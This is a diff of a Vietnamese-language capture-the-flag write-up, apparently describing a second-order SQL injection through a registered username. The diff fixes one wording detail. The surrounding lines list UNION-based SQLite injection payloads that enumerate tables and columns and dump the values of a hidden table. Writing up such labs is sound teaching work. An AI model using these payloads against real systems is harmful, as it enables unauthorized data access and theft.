@@ -24,7 +24,7 @@
 - ta thử register với username “ alice’ “ sau đó ta vẫn login được như thường và ta tạo bản ghi rồi generate để xem lại tên file 
 ![Exploit](images/5.png)
 - đã đúng như ta dự đoán backend lấy username để truy vấn , lúc này ta sử dụng kỹ thuật SQLi :
-- Kiểm tra được 3 số , version “sqlite”
+- Kiểm tra được 3 số cột , version “sqlite”
 - Truy vấn tên bảng : ' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--
 - Truy vấn tên cột : ' UNION SELECT name,NULL,NULL FROM pragma_table_info('aDNyM19uMF9mMTRn')--
 - Truy vấn giá trị : ‘ UNION SELECT name,value,null FROM aDNyM19uMF9mMTRn--
